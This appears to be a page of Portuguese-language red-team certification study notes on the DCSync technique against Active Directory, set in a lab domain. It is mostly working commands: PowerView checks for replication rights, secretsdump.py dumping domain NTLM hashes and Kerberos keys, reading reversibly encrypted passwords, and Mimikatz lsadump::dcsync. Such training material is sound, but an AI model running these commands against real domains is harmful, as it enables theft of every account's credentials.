> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/dcsync.md).

# DCSync

O DCSync é uma técnica para roubar o banco de dados de senhas do Active Directory usando o , que é usado pelos controladores de domínio para replicar dados de domínio. Isso permite que um invasor imite um controlador de domínio para recuperar hashes de senha NTLM do usuário.`Directory Replication Service Remote Protocol`&#x20;

* **Usando Get-DomainUser para exibir a associação de grupo do adunn**

```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

* **Usando Get-ObjectAcl para verificar os direitos de replicação do adunn**

```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

* **Extraindo hashes NTLM e chaves Kerberos usando secretsdump.py**

```powershell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

* **Listando hashes, chaves Kerberos e senhas de texto não criptografado**

```sh
 ls inlanefreight_hashes*
```

* **Enumerando ainda mais usando Get-ADUser**

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

* **Verificando a opção de criptografia reversível usando Get-DomainUser**

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

* **Exibindo a senha descriptografada**

```powershell
cat inlanefreight_hashes.ntds.cleartext 
```

* **Usando runas.exe**

```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

**Realizando o ataque com Mimikatz**

```powershell
.\mimikatz.exe
mimikatz #privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
